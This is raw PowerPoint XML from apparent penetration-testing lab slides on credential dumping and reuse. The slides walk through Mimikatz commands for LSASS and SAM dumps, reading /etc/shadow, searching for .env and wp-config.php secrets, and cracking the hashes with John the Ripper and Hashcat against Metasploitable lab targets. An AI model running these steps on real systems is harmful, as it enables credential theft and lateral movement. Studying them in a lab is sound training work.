                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>autoroute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Meterpreter OR msfconsole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7382610"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="311211">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US"/>
                        <a:t>socks_proxy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msfconsole</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>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8700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89525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90599"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>● </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 03: Credential Dumping &amp; Harvesting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20091"/>
            <a:ext cx="12192000" cy="5509259"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Extract passwords and hashes from the first machine to use them for the second machine. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Windows (Mimikatz)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use Mimikatz (or its PowerShell version) to dump LSA secrets, SAM hashes, and clear-text passwords from memory. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Extract hashes from /etc/shadow and search for "Configuration Files" (like wp-config.php or .env) that contain hardcoded database credentials. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Hash Cracking</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use John the Ripper or Hashcat to crack the harvested hashes locally on your Kali machine. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Learn that "Passwords found on Machine A often work on Machine B."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7197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934700" cy="1074057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🔐</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Task 03: Credential Dumping &amp; Harvesting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74057"/>
            <a:ext cx="12308114" cy="57839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Objective:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Extract passwords, NTLM hashes, and LSA secrets from Machine A and prepare them for reuse on Machine B (credential reuse / lateral movement).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Big Picture Flow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👉 This is the core concept: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>credential reuse / lateral movement </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>PART 1 — Windows Credential Dumping</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Step 1 — Enable Required Privileges</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1900" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Done </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>via a compromised shell of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>Windows (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1900" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="19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dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Windows protects credential storage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dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>You need elevated privileges to access it </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>Run:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
              <a:t>privilege::debug</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1900" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="19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9620"/>
            <a:ext cx="5283200" cy="162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226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-109751"/>
            <a:ext cx="12192000" cy="696088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What each command does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privilege::debug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Elevates privileges </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Enables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>DebugPrivilege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Required to access LSASS memory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Step 2 — Dump Credentials from Memory (LSASS)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Run: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🔹 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sekurlsa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>logonpasswords</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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👉 Extracts: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  Credentials from LSASS (Local Security Authority Subsystem Service)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Plaintext passwords (if available)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NTLM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>(NT LAN Manager)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> hashes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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000" dirty="0"/>
              <a:t> authentication protocol used by Windows systems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Logged-in user credentials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500" b="1" dirty="0"/>
              <a:t>Step 3 — Dump Local Account Hashes (SAM Database)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="25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🔹 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>sam</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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👉 Dumps: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Local user account hashes (SAM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>(Security Account Manager)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> database)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> Output includes:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Username</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>RID</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>NTLM hash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0" y="47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2359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050"/>
            <a:ext cx="5257800" cy="68580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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🐧 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PART 2 — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 2 Linux Credential Harvesting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Objective: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Extract password hashes and hardcoded credentials from a Linux system (e.g., </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 2) to reuse them for lateral movement.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Execution Context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You must have shell access to the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> Linux target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Root privileges are required to access sensitive files like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/shadow</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill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Same for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> 2 Linux:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:latin typeface="Arial Unicode MS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 Unicode MS"/>
              </a:rPr>
              <a:t>⚠️ /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/shadow requires root access</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="20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709369-2E16-44F8-8537-1610CB7C0D33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5924550" y="19050"/>
            <a:ext cx="6267450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7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔍  Step 1 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Password Hashes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>extraction </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>cat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/shadow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👉 Contains:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Password hashes of all users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</a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/shadow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t> contains: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hashed passwords (NOT plaintext)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Usually </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>SHA-512 or similar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>, NOT NTLM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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>/shadow → Linux password hashes (requires cracking or reuse via other means)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👉 Extract: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Username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sz="1800" dirty="0"/>
              <a:t>Hashed passwords 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sz="1800" dirty="0"/>
              <a:t>NTLM hashes  </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20648402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6096000" cy="673462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b="1" dirty="0"/>
              <a:t>Step 2 — Search for Hardcoded Credentials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Developers often store credentials inside configuration files.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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 err="1"/>
              <a:t>grep</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> password /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>/www/ -r</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>find / -name ".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>" 2&gt;/dev/null</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>find / -name "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>wp-config.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>" 2&gt;/dev/null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sz="1700" dirty="0"/>
              <a:t>Developers </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>hardcode credentials everywhere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> 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sz="1700" dirty="0"/>
              <a:t>Common loot locations: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> → environment variables (DB credentials, API keys)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>wp-config.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> → WordPress database credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>config</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> files </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>backup files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700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1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89431F-32A3-402A-9015-82432299361E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5905500" y="123371"/>
            <a:ext cx="6124574" cy="5027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What to Look For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Inside these files, extract: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Database usernames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Database passwords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API keys or secrets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👉 These credentials are often stored in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>plaintext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Key Notes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Linux uses different hashing algorithms than Windows (no NTLM in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/shadow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1800" dirty="0"/>
              <a:t>)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Hardcoded credentials are often easier to reuse than hashes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Always check web directories and configuration files</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23163772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828206" cy="68579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E2AC00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>🔥</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> PART 3 — Hash Cracking (Kali)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Crack harvested password hashes using offline techniques to recover plaintext credentials for reuse.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Execution Environment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Perform cracking on your Kali Linux machine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Use hashes extracted from:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1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Windows (NTLM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1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Linux (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>/shadow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/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Step 1 — Prepare Hash File</a:t>
            </a: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Store extracted hashes in a file:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty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err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> hash.txt</a:t>
            </a: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Paste hashes in correct format (one per line)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Step 2 — Crack Windows Hashes (NTLM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>John the Ripper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john hash.txt --wordlist=/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/share/wordlists/rockyou.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Hashcat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 err="1"/>
              <a:t>hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -m 1000 hash.txt rockyou.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Or if you are not inside the directory of /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/share/wordlists/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -m 1000 hash.txt /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/share/wordlists/rockyou.txt</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32328506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0100"/>
            <a:ext cx="11828206" cy="68579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Step 3 — Crack Linux Hashes (/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>/shadow)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Linux hashes are different (e.g., SHA-512)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Using John the Ripper</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>john --format=sha512crypt hash.txt --wordlist=/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/share/wordlists/rockyou.txt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Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Hashcat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err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>hashcat</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -m 1800 hash.txt /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>usr</a:t>
            </a:r>
            <a:r>
